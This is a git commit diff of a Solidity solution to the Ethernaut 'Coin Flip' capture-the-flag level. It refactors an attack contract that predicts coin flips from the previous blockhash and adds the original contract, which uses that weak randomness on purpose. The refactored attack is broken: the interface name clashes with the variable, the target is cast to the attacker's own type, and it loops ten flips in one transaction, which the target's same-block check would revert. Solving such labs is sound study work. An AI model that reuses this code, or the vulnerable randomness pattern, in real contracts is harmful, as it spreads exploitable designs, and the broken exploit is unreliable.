de9c9a780eff095e1ead76c872bf88f36f5a1474
DanielBoye <danielboye888@gmail.com>
2023-10-10 19:21:50 +0200

    Renaming and refactor

--- ethernaut/03-Coin-Flip/Coin-FlipSolve.sol
+++ ethernaut/03-Coin-Flip/Coin-FlipSolve.sol
@@ -1,28 +1,65 @@
 pragma solidity ^0.8.0;
 
-interface ICoinFlip {
+interface target {
     function consecutiveWins() external view returns (uint256);
     function flip(bool) external returns (bool);
 }
 
-contract Hack {
-    ICoinFlip private immutable target;
+contract solve {
+    solve private immutable target;
     uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _target) {
-        target = ICoinFlip(_target);
+        target = solve(_target);
     }
 
-    // call this function 10 times
+    // for loop to guess 10 times
     function flip() external {
-        bool guess = _guess();
-        require(target.flip(guess), "guess failed");
+        for (uint i = 0; i < 10; i++) {
+            bool guess = _guess();
+            require(target.flip(guess), "failed");
+        }
     }
 
+    
+    
     function _guess() private view returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
-
         uint256 coinFlip = blockValue / FACTOR;
-        return coinFlip == 1 ? true : false;
+        bool side = coinFlip == 1 ? true : false;
+        return side;
     }
+}
+
+
+// Original CoinFlip contract
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
 }
